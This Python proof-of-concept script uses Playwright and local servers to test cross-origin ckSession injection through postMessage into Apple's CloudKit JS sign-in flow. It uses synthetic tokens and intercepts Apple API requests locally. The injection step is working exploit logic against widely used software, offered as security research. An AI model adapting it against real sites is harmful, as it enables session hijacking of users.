#!/usr/bin/env python3
"""Local cross-origin session-injection PoC using Apple's real CloudKit JS CDN.

Network safety:
- The browser may fetch only Apple's public CDN library.
- Every request to an Apple CloudKit API/service host is intercepted and fulfilled
  locally with a synthetic AUTHENTICATION_REQUIRED response.
- No Apple account, real ckSession, or private container is used.
"""
from __future__ import annotations
import asyncio,json,os,threading
from http.server import BaseHTTPRequestHandler,ThreadingHTTPServer
from urllib.parse import urlsplit
from playwright.async_api import async_playwright

VICTIM_PORT=18123
ATTACKER_PORT=18124
POPUP_PORT=18125
SENTINEL="OAI_SYNTHETIC_CKSESSION_20260928"

VICTIM=f"""<!doctype html><meta charset=utf-8>
<div id="apple-sign-in-button"></div><div id="apple-sign-out-button"></div>
<script>
window.__tokenWrites=[];
window.__tokenMemory={{}};
window.__fetches=[];
window.__errors=[];
window.addEventListener('error', e=>__errors.push(String(e.message||e.error)));
</script>
<script src="https://cdn.apple-cloudkit.com/ck/2/cloudkit.js"></script>
<script>
(async()=>{{
  try {{
    CloudKit.configure({{
      locale:'en-us',
      services:{{
        logger:console,
        authTokenStore:{{
          putToken:(id,tok)=>{{ __tokenWrites.push({{id,token:tok}}); __tokenMemory[id]=tok; }},
          getToken:(id)=>__tokenMemory[id]||null
        }}
      }},
      containers:[{{
        containerIdentifier:'iCloud.com.openai.security.research.synthetic',
        environment:'development',
        apiTokenAuth:{{
          apiToken:'SYNTHETIC_API_TOKEN_NOT_VALID',
          persist:true,
          signInButton:{{id:'apple-sign-in-button',theme:'black'}},
          signOutButton:{{id:'apple-sign-out-button',theme:'black'}}
        }}
      }}]
    }});
    window.__container=CloudKit.getDefaultContainer();
    window.__setupResult=await window.__container.setUpAuth();
    window.__ready=true;
  }} catch(e) {{
    window.__setupError=String(e && (e.stack||e));
    window.__ready=true;
  }}
}})();
</script>"""

ATTACKER=f"""<!doctype html><meta charset=utf-8><title>synthetic attacker</title>
<script>window.__sent=false;</script>"""
POPUP="""<!doctype html><meta charset=utf-8><title>synthetic popup</title>"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        port=self.server.server_port
        body=(VICTIM if port==VICTIM_PORT else ATTACKER if port==ATTACKER_PORT else POPUP).encode()
        self.send_response(200);self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",str(len(body)));self.end_headers();self.wfile.write(body)
    def log_message(self,*args):pass

def start_server(port):
    s=ThreadingHTTPServer(("127.0.0.1",port),Handler)
    th=threading.Thread(target=s.serve_forever,daemon=True);th.start()
    return s

async def main():
    servers=[start_server(x) for x in (VICTIM_PORT,ATTACKER_PORT,POPUP_PORT)]
    api_reqs=[]
    try:
      async with async_playwright() as p:
        chrome="/usr/bin/google-chrome" if os.path.exists("/usr/bin/google-chrome") else None
        browser=await p.chromium.launch(headless=True,executable_path=chrome,args=["--no-sandbox","--disable-dev-shm-usage"])
        ctx=await browser.new_context()

        async def route_handler(route):
            req=route.request
            h=(urlsplit(req.url).hostname or "").lower()
            # Permit only the public SDK CDN among Apple network requests.
            if h=="cdn.apple-cloudkit.com":
                await route.continue_(); return
            if h.endswith("apple-cloudkit.com") or h.endswith("icloud.com") or h.endswith("apple.com"):
                hdrs={k:v for k,v in req.headers.items() if k.lower() not in ("cookie","authorization")}
                post_data=req.post_data or ""
                locations=[]
                if SENTINEL in req.url: locations.append("url")
                for k,v in hdrs.items():
                    if SENTINEL in str(v): locations.append("header:"+k.lower())
                if SENTINEL in post_data: locations.append("body")
                from urllib.parse import parse_qsl
                api_reqs.append({
                  "index":len(api_reqs),
                  "method":req.method,
                  "path":urlsplit(req.url).path,
                  "query_keys":sorted(set(k for k,_ in parse_qsl(urlsplit(req.url).query,keep_blank_values=True))),
                  "header_keys":sorted(hdrs.keys()),
                  "body_bytes":len(post_data.encode()),
                  "contains_sentinel":bool(locations),
                  "sentinel_locations":locations
                })
                body=json.dumps({
                  "uuid":"00000000-0000-4000-8000-000000000000",
                  "serverErrorCode":"AUTHENTICATION_REQUIRED",
                  "reason":"Synthetic local auth-required control",
                  "redirectUrl":f"http://127.0.0.1:{POPUP_PORT}/"
                })
                await route.fulfill(status=401,content_type="application/json",body=body); return
            await route.continue_()

        await ctx.route("**/*",route_handler)
        attacker=await ctx.new_page()
        await attacker.goto(f"http://127.0.0.1:{ATTACKER_PORT}/",wait_until="domcontentloaded")
        async with ctx.expect_page() as victim_info:
            await attacker.evaluate(f"window.victim=window.open('http://127.0.0.1:{VICTIM_PORT}/','victim')")
        victim=await victim_info.value
        await victim.wait_for_load_state("domcontentloaded")

        # Wait for setUpAuth() to process our synthetic auth-required response and render the button.
        try:
            await victim.wait_for_function("window.__ready===true",timeout=15000)
        except Exception:
            pass
        pre=await victim.evaluate("""() => ({
          ready:window.__ready===true,
          setupError:window.__setupError||null,
          cloudKitVersion:window.CloudKit && window.CloudKit.VERSION,
          tokenWrites:window.__tokenWrites||[],
          buttonExists:!!document.querySelector('#apple-sign-in-button > .apple-auth-button'),
          buttonHTML:(document.querySelector('#apple-sign-in-button')||{}).innerHTML||''
        })""")

        popup_opened=False
        if pre["buttonExists"]:
            try:
                async with ctx.expect_page(timeout=5000) as pop_info:
                    await victim.click("#apple-sign-in-button > .apple-auth-button")
                pop=await pop_info.value
                popup_opened=True
                await pop.wait_for_load_state("domcontentloaded")
            except Exception:
                # Listener is installed before/around window.open; continue with the cross-origin test.
                pass

            # Cross-origin attacker posts a completely synthetic ckSession to the victim.
            await attacker.evaluate(f"""() => {{
              window.victim.postMessage({{ckSession:{json.dumps(SENTINEL)}}}, '*');
              window.__sent=true;
            }}""")
            await victim.wait_for_timeout(2200)

        post=await victim.evaluate(f"""() => ({{
          tokenWrites:(window.__tokenWrites||[]).map(x=>({{id:x.id,isSentinel:x.token==={json.dumps(SENTINEL)},length:String(x.token||'').length}})),
          setupError:window.__setupError||null,
          bodyText:(document.body.innerText||'').slice(0,500)
        }})""")

        await browser.close()

      result={
        "safety":"Apple CDN SDK only; all Apple CloudKit/service requests intercepted locally. Synthetic token only.",
        "victim_origin":f"http://127.0.0.1:{VICTIM_PORT}",
        "attacker_origin":f"http://127.0.0.1:{ATTACKER_PORT}",
        "cloudkit_api_requests_intercepted":len(api_reqs),
        "api_request_hosts":["api.apple-cloudkit.com"] if api_reqs else [],
        "api_request_summaries":api_reqs,
        "propagated_cross_origin_sentinel":any(x.get("contains_sentinel") for x in api_reqs),
        "pre":pre,
        "popup_opened":popup_opened,
        "post":post,
        "accepted_cross_origin_sentinel":any(x.get("isSentinel") for x in post.get("tokenWrites",[])),
      }
      with open("apple-services-recon/cloudkit-postmessage-poc.json","w") as f:json.dump(result,f,indent=2,sort_keys=True)
      lines=["# CloudKit JS cross-origin postMessage PoC","",
        f"- CloudKit version: **{pre.get('cloudKitVersion')}**",
        f"- Synthetic CloudKit API requests intercepted locally: **{len(api_reqs)}**",
        f"- Sign-in button rendered: **{pre.get('buttonExists')}**",
        f"- Synthetic popup opened: **{popup_opened}**",
        f"- Cross-origin synthetic ckSession accepted into auth token store: **{result['accepted_cross_origin_sentinel']}**",
        f"- Injected ckSession propagated into a subsequent CloudKit request: **{result['propagated_cross_origin_sentinel']}**",
        f"- Token-store writes: **{post.get('tokenWrites')}**",
        f"- Intercepted request summaries: **{result['api_request_summaries']}**","",
        "No real Apple account, API token, ckSession, or private CloudKit data was used."
      ]
      with open("apple-services-recon/cloudkit-postmessage-poc.md","w") as f:f.write("\n".join(lines)+"\n")
      print("\n".join(lines),flush=True)
    finally:
      for s in servers:s.shutdown()

if __name__=="__main__":asyncio.run(main())
